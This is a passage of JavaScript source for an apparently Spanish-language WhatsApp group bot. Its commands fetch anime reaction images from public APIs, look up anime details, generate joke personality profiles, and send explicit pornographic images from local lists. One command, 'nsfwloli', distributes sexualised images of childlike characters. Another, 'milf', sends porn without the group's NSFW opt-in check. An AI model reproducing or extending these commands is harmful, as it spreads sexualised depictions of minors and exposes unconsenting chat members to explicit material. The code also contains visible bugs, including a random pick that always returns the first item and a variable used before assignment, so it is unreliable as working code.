            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'woof':
case 'ladrido': {
    axios.get(`https://nekos.life/api/v2/img/woof`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case '8ball':
case 'bola_8': {
    axios.get(`https://nekos.life/api/v2/img/8ball`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'goose':
case 'ganso': {
    axios.get(`https://nekos.life/api/v2/img/goose`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'gecg': {
    axios.get(`https://nekos.life/api/v2/img/gecg`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'feed':
case 'alimentar': {
    axios.get(`https://nekos.life/api/v2/img/feed`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'avatar': {
    axios.get(`https://nekos.life/api/v2/img/avatar`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'fox_girl':
case 'chica_zorro': {
    axios.get(`https://nekos.life/api/v2/img/fox_girl`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'lizard':
case 'lagarto': {
    axios.get(`https://nekos.life/api/v2/img/lizard`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'spank':
case 'azotar': {
    axios.get(`https://nekos.life/api/v2/img/${command}`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'meow':
case 'maullar': {
    axios.get(`https://nekos.life/api/v2/img/${command}`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'tickle':
case 'cosquillas': {
    axios.get(`https://nekos.life/api/v2/img/${command}`)
        .then(({ data }) => {
            SenseiOfc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author });
        });
}
break
case 'animeawoo':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animemegumin':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeshinobu':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehandhold':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehighfive':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecringe':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animedance':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehappy':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeglomp':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmug':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeblush':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewave':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmile':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepoke':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewink':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebonk':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebully':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeyeet':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebite':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animelick':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekill':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecry':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewlp':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekiss':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehug':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeneko':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepat':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeslap':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecuddle':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewaifu':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animenom':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefoxgirl':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await SenseiOfc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animetickle': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await SenseiOfc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animegecg': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await SenseiOfc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'dogwoof': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await SenseiOfc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '8ballpool': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await SenseiOfc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'goosebird': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await SenseiOfc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefeed': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await SenseiOfc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeavatar': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await SenseiOfc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'lizardpic': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await SenseiOfc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'catmeow': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await SenseiOfc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'anime':
  if (!text) return replygc(`¿Cuál anime estás buscando?`)
  const malScraper = require('mal-scraper')
  await StickWait()
  const anime = await malScraper.getInfoFromName(text).catch(() => null)
  if (!anime) return replygc(`No se pudo encontrar`)
  let animetxt = `
┌──「 *ANIME* 」
│ 🎀 *Título:* ${anime.title}
│ 🎋 *Tipo:* ${anime.type}
│ 🎐 *Estrenado en:* ${await translateToSpanish(anime.premiered)}
│ 💠 *Episodios Totales:* ${anime.episodes}
│ 📈 *Estado:* ${await translateToSpanish(anime.status)}
│ 💮 *Géneros:* ${await translateToSpanish(anime.genres)}
│ 📍 *Estudio:* ${anime.studios}
│ 🌟 *Puntuación:* ${anime.score}
│ 💎 *Clasificación:* ${await translateToSpanish(anime.rating)}
│ 🏅 *Rango:* ${anime.ranked}
│ 💫 *Popularidad:* ${anime.popularity}
│ ♦️ *Tráiler:* ${anime.trailer}
│ 🌐 *URL:* ${anime.url}
│ ❄ *Descripción:* ${await translateToSpanish(anime.synopsis)}
└────────────
`
  await SenseiOfc.sendMessage(m.chat, { image: { url: anime.picture }, caption: animetxt }, { quoted: m })
  break
case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return replygc(mess.nsfw)
                await StickWait()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                SenseiOfc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return replygc(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return StickGroup()
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await SenseiOfc.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'thighs':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/thighs.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await SenseiOfc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await SenseiOfc.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return replygc(mess.nsfw)
await StickWait()
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
SenseiOfc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'checkme':
    let [neme, bet] = args
    bet = `${sender}`
    var sifat = ['Bien', 'Antipático', 'Chapri', 'Nibba/nibbi', 'Molesto', 'Dilapidado', 'Persona enojada', 'Educado', 'Carga', 'Genial', 'Cringe', 'Mentiroso']
    var hoby = ['Cocinar', 'Bailar', 'Jugar', 'Jugar videojuegos', 'Pintar', 'Ayudar a otros', 'Ver anime', 'Leer', 'Andar en bicicleta', 'Cantar', 'Chatear', 'Compartir memes', 'Dibujar', 'Gastar el dinero de los padres', 'Jugar Verdad o Reto', 'Quedarse solo']
    var bukcin = Array.from({ length: 100 }, (_, i) => (i + 1).toString())
    var arp = Array.from({ length: 100 }, (_, i) => (i + 1).toString())
    var cakep = ['Sí', 'No', 'Muy feo', 'Muy guapo']
    var wetak = ['Atento', 'Generoso', 'Persona enojada', 'Lo siento', 'Sumiso', 'Bien', 'Lo siento', 'De buen corazón', 'Paciente', 'UwU', 'Top', 'Servicial']
    var baikk = Array.from({ length: 100 }, (_, i) => (i + 1).toString())
    var bhuruk = Array.from({ length: 100 }, (_, i) => (i + 1).toString())
    var cerdhas = Array.from({ length: 100 }, (_, i) => (i + 1).toString())
    var berhani = Array.from({ length: 100 }, (_, i) => (i + 1).toString())
    var mengheikan = Array.from({ length: 100 }, (_, i) => (i + 1).toString())
    var sipat = pickRandom(sifat)
    var biho = pickRandom(hoby)
    var bhucin = pickRandom(bukcin)
    var senga = pickRandom(arp)
    var chakep = pickRandom(cakep)
    var watak = pickRandom(wetak)
    var baik = pickRandom(baikk)
    var burug = pickRandom(bhuruk)
    var cerdas = pickRandom(cerdhas)
    var berani = pickRandom(berhani)
    var takut = pickRandom(mengheikan)

    profile = `*≡══《 Revisar @${bet.split('@')[0]} 》══≡*

*Nombre :* ${pushname}
*Característica :* ${sipat}
*Pasatiempo :* ${biho}
*Simp :* ${bhucin}%
*Genial :* ${senga}%
*Guapo :* ${chakep}
*Carácter :* ${watak}
*Morales Buenas :* ${baik}%
*Morales Malas :* ${burug}%
*Inteligencia :* ${cerdas}%
*Coraje :* ${berani}%
*Miedo :* ${takut}%

*≡═══《 PROPIEDADES DE REVISIÓN 》═══≡*`

    try {
        ppuser = await SenseiOfc.profilePictureUrl(m.sender, 'image')
    } catch (err) {
        ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
    }
    ppxeon = await getBuffer(ppuser)
